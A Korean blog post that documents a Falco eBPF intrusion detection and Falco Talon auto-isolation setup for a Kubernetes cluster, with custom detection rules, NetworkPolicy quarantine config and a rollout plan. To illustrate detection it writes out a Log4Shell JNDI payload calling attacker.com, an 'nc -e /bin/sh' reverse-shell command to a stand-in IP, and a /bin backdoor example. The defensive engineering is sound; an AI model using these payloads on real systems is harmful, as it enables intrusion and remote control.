---
title: "Falco eBPF 런타임 보안 아키텍처 (IDS + IPS)"
date: 2026-01-25T16:00:00+09:00
tags: ["kubernetes", "falco", "ebpf", "security", "ids", "ips", "runtime-security"]
categories: ["study", "Security"]
summary: "eBPF 기반 컨테이너 런타임 보안 모니터링과 자동 대응. Falco IDS + Falco Talon IPS 아키텍처, 실제 RCE 공격 탐지 및 NetworkPolicy 기반 자동 격리"
draft: false
cover:
  image: "cover.jpg"
  alt: "Falco eBPF 런타임 보안 아키텍처 (IDS + IPS)"
  relative: true
---

## 핵심 질문

**"컨테이너 런타임에서 공격을 어떻게 탐지하고 자동으로 차단하는가?"**

이 글은 eBPF 기반 런타임 보안 시스템의 완전한 구현을 다룹니다.

---

## 1. 왜 Falco인가?

### 보안 계층별 도구 비교

| 보안 계층 | 도구 | 역할 | 한계 |
|-----------|------|------|------|
| **빌드 타임** | Trivy | 이미지 취약점 스캔 | 런타임 행위 탐지 불가 |
| **네트워크** | CiliumNetworkPolicy | L3/L4 트래픽 제어 | syscall 레벨 탐지 불가 |
| **런타임** | **Falco** | 이상 행위 실시간 탐지 | ✅ 유일한 런타임 보안 |

### 탐지 예시

```
시나리오: 공격자가 Log4Shell 취약점으로 RCE 공격 시도

1. kubectl exec가 아닌 Java 프로세스가 /bin/sh 실행
   ↓
2. Falco 감지: "Java Process Spawning Shell" (CRITICAL)
   ↓
3. Falco Talon 자동 대응 (5초 이내):
   - Pod에 quarantine=true 라벨 추가
   - NetworkPolicy 생성하여 모든 Egress 차단
   - Slack 알림 전송
   ↓
4. 효과:
   - C&C 서버 통신 차단 (Reverse Shell 실패)
   - 내부 네트워크 스캔 불가
   - 데이터 유출 방지
   - Pod 유지로 포렌식 조사 가능
```

**개선 효과**: 운영자 수동 대응 (5분 ~ 1시간) → 자동 격리 (5초) = 99% 단축

---

## 2. Falco 아키텍처

### 전체 구조

```
┌─────────────────────────────────────────────────────────────────┐
│                     Kubernetes Cluster                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │                  각 노드 (DaemonSet)                       │  │
│  │                                                            │  │
│  │   ┌──────────┐    eBPF     ┌──────────────────────────┐  │  │
│  │   │ Kernel   │ ──────────→ │ Falco Pod                │  │  │
│  │   │ syscalls │             │  ├─ falco (main)         │  │  │
│  │   └──────────┘             │  └─ falcoctl (sidecar)   │  │  │
│  │                            └───────────┬──────────────┘  │  │
│  │                                        │                   │  │
│  └────────────────────────────────────────│───────────────────┘  │
│                                           │                      │
│                                           ↓                      │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │              Falcosidekick (Alert Hub)                      │ │
│  │                                                              │ │
│  │   Alert 수신 → 다양한 목적지로 전송                          │ │
│  │   ├─ Loki (로그 저장)                                       │ │
│  │   ├─ Slack (실시간 알림)                                    │ │
│  │   ├─ Webhook (커스텀)                                       │ │
│  │   └─ Falco Talon (IPS - 자동 대응)                          │ │
│  │                                                              │ │
│  └────────────────────────┬────────────────────────────────────┘ │
│                           │                                      │
│                           ↓                                      │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │          Falco Talon (Response Engine - IPS)               │ │
│  │                                                              │ │
│  │   자동 대응 액션:                                            │ │
│  │   ├─ Pod에 quarantine 라벨 추가                            │ │
│  │   ├─ NetworkPolicy 생성 (트래픽 차단)                       │ │
│  │   └─ Slack 알림 (포렌식 가이드)                            │ │
│  │                                                              │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 컴포넌트 역할

| 컴포넌트 | 역할 | 배포 방식 | 리소스 |
|----------|------|----------|--------|
| **Falco** | syscall 모니터링, 룰 평가 | DaemonSet (모든 노드) | CPU 50m, RAM 200Mi |
| **Falcosidekick** | Alert 전송 Hub | Deployment (1 replica) | CPU 10m, RAM 50Mi |
| **Falco Talon** | 자동 대응 (IPS) | Deployment (1 replica) | CPU 50m, RAM 128Mi |
| **Falcosidekick UI** | Alert 대시보드 | Deployment (1 replica) | CPU 10m, RAM 50Mi |

**총 리소스**: CPU ~250m, RAM ~800Mi (클러스터 리소스 대비 1%)

---

## 3. eBPF 드라이버

### eBPF란?

**Extended Berkeley Packet Filter**: 커널 공간에서 안전하게 실행되는 샌드박스 프로그램

```
┌─────────────────────────────────────────┐
│          User Space                     │
│  ┌───────────────────────────────────┐ │
│  │   Falco (eBPF 프로그램 로드)      │ │
│  └─────────────┬─────────────────────┘ │
└────────────────┼───────────────────────┘
                 │ eBPF 시스템 콜
─────────────────┼───────────────────────
┌────────────────┼───────────────────────┐
│                ↓        Kernel Space    │
│  ┌─────────────────────────────────┐   │
│  │   eBPF Runtime                  │   │
│  │   - 안전성 검증                 │   │
│  │   - JIT 컴파일                  │   │
│  │   - 이벤트 필터링               │   │
│  └─────────────┬───────────────────┘   │
│                ↓                        │
│  ┌─────────────────────────────────┐   │
│  │   Kernel Hooks (syscalls)       │   │
│  │   - execve(), open(), socket()  │   │
│  │   - connect(), clone(), etc.    │   │
│  └─────────────────────────────────┘   │
└─────────────────────────────────────────┘
```

### 드라이버 선택

| 드라이버 | 최소 커널 | 장점 | 단점 | 선택 |
|----------|-----------|------|------|------|
| **modern_ebpf** | 5.8+ | CO-RE 기반, 커널 모듈 불필요 | 최신 커널 필요 | ✅ **권장** |
| ebpf (classic) | 4.14+ | 넓은 호환성 | modern보다 성능 낮음 | ⚠️ 대체 |
| kmod | 2.6+ | 모든 커널 지원 | 커널 모듈 로드 필요, 보안 위험 | ❌ 비권장 |

**현재 환경**: 커널 6.8.0-90-generic → modern_ebpf 사용 ✅

**Cilium과 충돌 없음**: 두 도구 모두 eBPF 사용, 공존 가능 ✅

---

## 4. 커스텀 탐지 룰

### Rule 1: Java Process Spawning Shell (RCE 방어)

**우선순위**: CRITICAL
**목적**: Log4Shell, Spring4Shell 같은 RCE 공격 탐지

```yaml
- rule: Java Process Spawning Shell
  desc: Detect java process spawning a shell (Likely RCE attack)
  condition: >
    spawned_process and
    proc.pname exists and
    proc.pname in (java, javac) and
    proc.name in (bash, sh, ksh, zsh, dash) and
    container
  output: >
    🚨 CRITICAL: Java 프로세스가 Shell을 실행했습니다 (RCE 공격 의심!)
    (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
     parent=%proc.pname cmd=%proc.cmdline container=%container.name)
  priority: CRITICAL
  tags: [host, container, process, mitre_execution, T1059, rce, java]
```

**정상 vs 악의적 시나리오**:

| 시나리오 | 가능성 | 판단 |
|----------|--------|------|
| **정상**: Java가 shell 실행 | 0% | Spring Boot는 shell 불필요 |
| **악의적**: Log4Shell RCE | 100% | 원격 코드 실행 공격 |

**실제 공격 예시**:
```bash
# Log4Shell 페이로드
POST /api/posts HTTP/1.1
{"title": "${jndi:ldap://attacker.com/a}"}

# Log4j 취약점 발동
Java 프로세스 → /bin/sh 실행

# Falco 탐지 (즉시)
CRITICAL: Java Process Spawning Shell
parent=java cmd=/bin/sh -c "nc -e /bin/sh 1.2.3.4 4444"
```

---

### Rule 2: Package Manager in Container (Immutability 위반)

**우선순위**: WARNING
**목적**: 불변성 원칙 위반 탐지 (공격 도구 설치 시도)

```yaml
- rule: Launch Package Management Process in Container
  desc: Package management ran inside container (Immutability violation)
  condition: >
    spawned_process and
    container and
    proc.name in (apk, apt, apt-get, yum, rpm, dnf, pip, pip3, npm)
  output: >
    ⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!
    (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
     cmd=%proc.cmdline container=%container.name)
  priority: WARNING
  tags: [container, process, mitre_execution, T1059]
```

**시나리오 분석**:

| 상황 | 명령어 | 판단 |
|------|--------|------|
| **정상**: 이미지 빌드 | Dockerfile: RUN apk add curl | ✅ 빌드 타임 |
| **비정상**: 런타임 설치 | kubectl exec -- apk add nmap | ❌ 공격 도구 설치 |

**실제 테스트**:
```bash
# 테스트 명령
kubectl exec -n blog-system web-bdcdfd7bd-n6m64 -- apk update

# Alert 발생 (Grafana Loki)
{priority="Warning"} | json
│
└─> ⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!
    pod=web-bdcdfd7bd-n6m64 namespace=blog-system cmd=apk update
```

---

### Rule 3: Write to Binary Directory (Drift Detection)

**우선순위**: ERROR
**목적**: 시스템 디렉토리 변조 감지 (백도어, rootkit 설치)

```yaml
- rule: Write to Binary Dir
  desc: Attempt to write to system binary directories
  condition: >
    open_write and
    container and
    (fd.name startswith /bin/ or
     fd.name startswith /usr/bin/ or
     fd.name startswith /sbin/ or
     fd.name startswith /usr/sbin/)
  output: >
    🔴 ERROR: 바이너리 디렉토리에 쓰기 시도 감지!
    (user=%user.name file=%fd.name pod=%k8s.pod.name
     namespace=%k8s.ns.name cmd=%proc.cmdline)
  priority: ERROR
  tags: [container, filesystem, mitre_persistence, T1543]
```

**공격 시나리오**:
```bash
# 공격자가 백도어 설치 시도
echo '#!/bin/sh\nnc -e /bin/sh 1.2.3.4 4444' > /bin/backdoor
chmod +x /bin/backdoor

# Falco 탐지
ERROR: 바이너리 디렉토리에 쓰기 시도 감지!
file=/bin/backdoor cmd=echo ...
```

---

### Rule 4: Unexpected Outbound Connection (Reverse Shell 방어)

**우선순위**: NOTICE
**목적**: C&C 서버 통신, 데이터 유출 감지

```yaml
- rule: Unexpected Outbound Connection
  desc: Detect outbound connections to uncommon ports
  condition: >
    outbound and
    container and
    fd.type in (ipv4, ipv6) and
    not fd.lport in (80, 443, 8080, 3306, 53) and
    not fd.sip in ("127.0.0.1", "::1")
  output: >
    🔵 NOTICE: 예상치 못한 외부 연결 시도 감지
    (connection=%fd.name lport=%fd.lport rport=%fd.rport
     pod=%k8s.pod.name cmd=%proc.cmdline)
  priority: NOTICE
  tags: [container, network, mitre_exfiltration, T1041]
```

**정상 vs 악의적 연결**:

| 연결 | 포트 | 판단 |
|------|------|------|
| MySQL 연결 | 3306 | ✅ 정상 (화이트리스트) |
| HTTPS API | 443 | ✅ 정상 (화이트리스트) |
| **Reverse Shell** | **4444** | ❌ **악의적 (탐지!)** |
| **C&C 서버** | **8888** | ❌ **악의적 (탐지!)** |

---

## 5. IDS vs IPS 비교

### 현재 구성: IDS + IPS (Hybrid)

| 모드 | 역할 | 동작 | 현재 상태 |
|------|------|------|----------|
| **IDS** | 탐지만 (Intrusion Detection) | CCTV + 경보기 | ✅ 활성화 (Loki, Grafana) |
| **IPS** | 탐지 + 차단 (Intrusion Prevention) | 자동 방범 시스템 | ✅ Dry-Run (Falco Talon) |

### IDS 모드 워크플로우

```
┌─────────────────────────────────────────────────────────────────┐
│                    IDS 모드 (탐지만)                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Falco가 이상 행위 탐지 (syscall 모니터링)                    │
│     ↓                                                            │
│  2. Falcosidekick이 Loki로 전송                                  │
│     ↓                                                            │
│  3. Grafana 대시보드에서 확인                                    │
│     ↓                                                            │
│  4. 수동 조사 및 대응 (운영자)                                   │
│     - kubectl describe pod                                       │
│     - kubectl logs                                               │
│     - 필요 시 Pod 삭제                                           │
│                                                                  │
│  ⏱️ 평균 대응 시간: 5분 ~ 1시간                                  │
│  🚨 문제: 공격자가 이 시간 동안 계속 활동 가능                    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### IPS 모드 워크플로우 (Falco Talon)

```
┌─────────────────────────────────────────────────────────────────┐
│           IPS 모드 (자동 격리 - NetworkPolicy)                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Falco가 CRITICAL Alert 탐지                                  │
│     - Java Process Spawning Shell                                │
│     ↓                                                            │
│  2. Falcosidekick이 Falco Talon에 Alert 전송                    │
│     ↓                                                            │
│  3. Falco Talon 자동 대응 (5초 이내)                             │
│     ├─ Pod에 "quarantine=true" 라벨 추가                        │
│     ├─ NetworkPolicy 생성 (Egress/Ingress 모두 차단)             │
│     └─ Slack 알림 전송 (포렌식 가이드)                          │
│     ↓                                                            │
│  4. 효과                                                         │
│     ✅ C&C 서버 통신 차단 (Reverse Shell 실패)                   │
│     ✅ 내부 네트워크 스캔 불가                                   │
│     ✅ 데이터 유출 방지                                          │
│     ✅ Pod 유지 → 포렌식 조사 가능                               │
│     ↓                                                            │
│  5. 운영자 조사 (격리 상태에서)                                  │
│     ├─ kubectl logs <pod> -n blog-system                         │
│     ├─ kubectl exec -it <pod> -- /bin/sh                         │
│     └─ 메모리 덤프, 프로세스 트리 분석                           │
│     ↓                                                            │
│  6. 판단 및 조치                                                 │
│     ├─ False Positive → 격리 해제                               │
│     │   kubectl delete networkpolicy quarantine-<pod>            │
│     └─ 실제 공격 → Pod 삭제 및 보안 사고 보고서 작성             │
│                                                                  │
│  ⏱️ 자동 대응 시간: 5초                                          │
│  ✅ 개선 효과: 99% 단축 (5분 → 5초)                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 6. NetworkPolicy 기반 격리 (Pod Isolation)

### 왜 Pod Deletion이 아닌 Pod Isolation인가?

| 방식 | 동작 | 장점 | 단점 | 선택 |
|------|------|------|------|------|
| **Pod Isolation** | NetworkPolicy로 네트워크 격리 | 증거 보존<br>서비스 유지<br>False Positive 대응 가능 | 완전 차단 아님<br>Pod 계속 실행 | ✅ **채택** |
| **Pod Termination** | 즉시 Pod 삭제 | 완전 차단<br>간단함 | 증거 손실<br>서비스 중단<br>False Positive 시 복구 어려움 | ❌ 위험 |

### 격리 NetworkPolicy 예시

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-was-7d4b9c8f-xj2k9
  namespace: blog-system
  labels:
    falco-response: "quarantine"
    created-by: "falco-talon"
spec:
  podSelector:
    matchLabels:
      app: was
      quarantine: "true"  # Talon이 자동 추가한 라벨
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: monitoring  # Grafana에서 조사 가능
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53  # DNS만 허용
```

**격리 효과**:
- **Egress 차단**: C&C 서버 통신 불가, 데이터 유출 방지
- **Ingress 차단**: 추가 공격 벡터 차단
- **DNS 허용**: Pod가 정상 종료될 수 있도록
- **Monitoring 허용**: Prometheus, Grafana에서 조사 가능

---

## 7. 실제 시나리오

### 시나리오 1: Log4Shell RCE 공격

**공격 과정**:
```
1. 공격자가 악의적 JNDI 페이로드 전송
   POST /api/posts HTTP/1.1
   {"title": "${jndi:ldap://attacker.com/Exploit}"}

2. Log4j 취약점으로 원격 코드 실행
   → Java 프로세스가 /bin/sh 실행

3. Reverse Shell 시도
   → /bin/sh -c "nc -e /bin/sh 1.2.3.4 4444"
```

**IDS 모드 (탐지만)**:
```
✅ Falco 탐지: "Java Process Spawning Shell" (CRITICAL)
📩 Slack 알림: "Java가 Shell을 실행했습니다!"
⏱️ 운영자 확인까지: 5분 ~ 1시간
🚨 이 사이 공격자는 계속 활동 가능:
   - 내부 네트워크 스캔 (kubectl get nodes)
   - 다른 서비스 공격 (Redis, MySQL 접근 시도)
   - 데이터 유출 (MySQL 덤프 → 외부 전송)
```

**IPS 모드 (Talon 활성화 시)**:
```
✅ Falco 탐지: "Java Process Spawning Shell" (CRITICAL)
⚡ Talon 자동 대응 (5초):
   1. Pod에 "quarantine=true" 라벨
   2. NetworkPolicy 생성
      → Egress: 모두 차단 (C&C 서버 통신 불가)
      → Ingress: 모두 차단 (추가 공격 불가)
   3. Slack 알림 + 포렌식 가이드

📊 효과:
   ✅ C&C 서버 통신 차단 → Reverse Shell 실패
   ✅ 내부 네트워크 스캔 불가
   ✅ 데이터 유출 방지
   ✅ Pod 유지 → 로그 분석, 메모리 덤프 가능

⏱️ 개선 효과: 5분 → 5초 (99% 단축)
```

---

### 시나리오 2: False Positive 대응

**상황**: 운영자가 긴급 패치를 위해 컨테이너에서 패키지 설치

```bash
kubectl exec -it was-xxxxx -n blog-system -- apk add curl
```

**Pod Deletion 방식 (위험)**:
```
⚠️ Falco 탐지: "Launch Package Management Process" (WARNING)
💥 자동으로 Pod 삭제
❌ 서비스 중단
❌ 운영자 작업 실패
❌ 복구 시간: 30초 ~ 1분
😡 운영자: "왜 내 Pod를 지웠어!?"
```

**Pod Isolation 방식 (안전)**:
```
⚠️ Falco 탐지: "Launch Package Management Process" (WARNING)
🔔 Talon 설정: WARNING은 격리하지 않고 알림만
📩 Slack 알림: "패키지 관리자 실행됨, 확인 필요"
✅ 운영자 확인: "내가 한 작업이야"
✅ 작업 계속 진행
```

**핵심 차이**:
- **Priority 기반 분리**: CRITICAL만 격리, WARNING은 알림만
- **Pod Isolation**: False Positive 시 격리 해제 가능 (수동)
- **증거 보존**: Pod 유지로 포렌식 조사 가능

---

## 8. Falco Talon 설정

### 핵심 설정 (talon-values.yaml)

```yaml
config:
  # Falco에서 Alert 수신
  listenAddress: 0.0.0.0
  listenPort: 2803

  # 규칙 정의
  rules:
    # Rule 1: Java RCE 공격 자동 격리
    - name: isolate-rce-attack
      match:
        rules:
          - Java Process Spawning Shell
        priority: CRITICAL
      actions:
        # 1. Pod 라벨 추가
        - action: kubernetes:label
          parameters:
            labels:
              quarantine: "true"
              falco-response: "isolated"

        # 2. NetworkPolicy 생성
        - action: kubernetes:networkpolicy
          parameters:
            allow_dns: true
            allow_monitoring: true
            deny_all_ingress: true
            deny_all_egress: true

        # 3. Slack 알림
        - action: notification:slack
          parameters:
            message: |
              🚨 **CRITICAL: RCE 공격 탐지 및 자동 격리**
              Pod: {{ .k8s_pod_name }}
              Command: {{ .proc_cmdline }}
              **조치**: NetworkPolicy 적용 완료

    # Rule 2: 패키지 관리자 실행 (알림만)
    - name: alert-package-manager
      match:
        rules:
          - Launch Package Management Process in Container
        priority: WARNING
      actions:
        # 격리 없이 Slack 알림만
        - action: notification:slack
```

### RBAC 권한

```yaml
rbac:
  create: true
  rules:
    # NetworkPolicy 관리 권한
    - apiGroups: ["networking.k8s.io"]
      resources: ["networkpolicies"]
      verbs: ["create", "get", "list", "delete"]

    # Pod 라벨 수정 권한
    - apiGroups: [""]
      resources: ["pods"]
      verbs: ["get", "list", "patch"]

    # Pod 삭제 권한 (비활성화 - 안전)
    # - apiGroups: [""]
    #   resources: ["pods"]
    #   verbs: ["delete"]
```

**최소 권한 원칙**: NetworkPolicy 관리만, Pod 삭제는 나중에 고려

---

## 9. 3단계 활성화 전략

### Phase 1: Dry-Run 모드 (1주) ✅ 현재

**기간**: 2026-01-23 ~ 2026-01-30
**목표**: False Positive 패턴 학습
**상태**: ✅ 설치 완료, 운영 중

```yaml
config:
  dry_run: true  # 실제 NetworkPolicy 생성 안 함, Slack 알림만
```

**관찰 사항**:
- 어떤 Alert가 자주 발생하는가?
- False Positive 비율은?
- 예외 규칙이 필요한가?

---

### Phase 2: WARNING 격리 (1주) ⏳ 1주 후

**기간**: 2026-01-30 ~ 2026-02-06 (예정)
**목표**: 비교적 안전한 WARNING부터 격리 시작

```yaml
config:
  dry_run: false
  rules:
    - name: isolate-package-manager
      match:
        priority: WARNING
      actions:
        - action: kubernetes:networkpolicy
```

**검증**:
- 서비스 중단 없는가?
- 격리 해제 프로세스는 원활한가?

---

### Phase 3: CRITICAL 격리 (지속 운영) ⏳ 2주 후

**기간**: 2026-02-06 ~ (지속 운영 예정)
**목표**: 실제 공격 자동 차단

```yaml
config:
  dry_run: false
  rules:
    - name: isolate-rce-attack
      match:
        priority: CRITICAL
      actions:
        - action: kubernetes:networkpolicy
```

**모니터링**:
- CRITICAL Alert 발생 빈도
- 자동 격리 성공률
- 평균 대응 시간 (목표: 5초 이내)

---

## 10. 격리 해제 방법

### 수동 해제 (False Positive 확인 후)

```bash
# 1. 격리 상태 확인
kubectl get networkpolicy -n blog-system | grep quarantine

# 2. NetworkPolicy 삭제
kubectl delete networkpolicy quarantine-was-xxxxx -n blog-system

# 3. Pod 라벨 제거
kubectl label pod was-xxxxx quarantine- falco-response- -n blog-system

# 4. 트래픽 복구 확인
kubectl exec -it was-xxxxx -n blog-system -- curl -I https://google.com
# 예상: HTTP/2 200
```

### 자동 해제 (향후 개선)

```yaml
# TTL 기반 자동 해제
- action: kubernetes:networkpolicy
  parameters:
    ttl: 1800  # 30분 후 자동 삭제
```

---

## 11. 모니터링

### Grafana 대시보드 쿼리

**모든 WARNING 이상 Alert**:
```
{priority=~"Warning|Error|Critical"}
```

**blog-system namespace만**:
```
{k8s_ns_name="blog-system"}
```

**격리된 Pod 수** (Prometheus):
```promql
falco_talon_actions_total{action="kubernetes:networkpolicy",status="success"}
```

### Slack 알림 템플릿

```
🚨 **자동 격리 실행**

**Alert**: Java Process Spawning Shell
**Priority**: CRITICAL
**Pod**: was-7d4b9c8f-xj2k9
**Namespace**: blog-system
**Command**: /bin/sh -c "nc -e /bin/sh 1.2.3.4 4444"

**조치 완료**:
✅ NetworkPolicy 적용 (모든 Egress 차단)
✅ Pod 라벨: quarantine=true

**다음 단계**:
1. 포렌식 조사:
   kubectl logs was-7d4b9c8f-xj2k9 -n blog-system
   kubectl exec -it was-7d4b9c8f-xj2k9 -n blog-system -- /bin/sh

2. False Positive 확인:
   - 정상 작업인가?
   - 예외 규칙 추가 필요한가?

3. 격리 해제 (정상 작업인 경우):
   kubectl delete networkpolicy quarantine-was-7d4b9c8f-xj2k9 -n blog-system
```

---

## 12. 최종 비교

| 항목 | IDS (현재) | IPS (Talon + Isolation) |
|------|-----------|------------------------|
| **탐지** | ✅ syscall 모니터링 | ✅ syscall 모니터링 |
| **알림** | ✅ Loki + Grafana | ✅ Loki + Slack |
| **대응** | ❌ 수동 (5분 ~ 1시간) | ✅ 자동 격리 (5초) |
| **증거 보존** | ✅ Loki 로그 | ✅ Loki + Pod 유지 |
| **서비스 영향** | ✅ 없음 | ⚠️ 격리된 Pod만 네트워크 차단 |
| **False Positive** | ✅ 무시 가능 | ✅ 격리 해제 가능 (수동) |
| **공격 차단** | ❌ 불가능 | ✅ C&C 통신 차단, 데이터 유출 방지 |
| **평균 대응 시간** | ⏱️ 5분 ~ 1시간 | ⏱️ 5초 |
| **개선 효과** | - | **99% 단축** |

---

## 13. 결론

### Falco의 가치

1. ✅ **유일한 런타임 보안**: Trivy(빌드), CiliumNetworkPolicy(네트워크)로는 불가능한 런타임 행위 탐지
2. ✅ **eBPF 기반**: 커널 모듈 불필요, Cilium과 충돌 없음
3. ✅ **자동 대응**: IPS 모드로 평균 대응 시간 99% 단축 (5분 → 5초)
4. ✅ **증거 보존**: Pod Isolation 방식으로 포렌식 조사 가능
5. ✅ **False Positive 대응**: Priority 기반 분리, 격리 해제 가능

### 핵심 메시지

**"컨테이너 런타임 보안은 eBPF 기반 IDS + IPS가 필수입니다."**

**정확한 이해**:
```
빌드 타임 (Trivy): 이미지 취약점 스캔
네트워크 (Cilium): L3/L4 트래픽 제어
런타임 (Falco): syscall 모니터링 + 자동 격리

✅ 3계층 모두 구현해야 완전한 DevSecOps
✅ Falco는 런타임 공격을 5초 내 자동 차단
✅ NetworkPolicy 기반 격리로 증거 보존 + 서비스 유지
```

---

**작성**: 2026-01-25
**태그**: kubernetes, falco, ebpf, ids, ips, runtime-security
**관련 문서**:
- [Falco 트러블슈팅](/study/2026-01-23-falco-runtime-security-troubleshooting/)
- [프로젝트 전체 아키텍처](/projects/local-k8s-blog/)
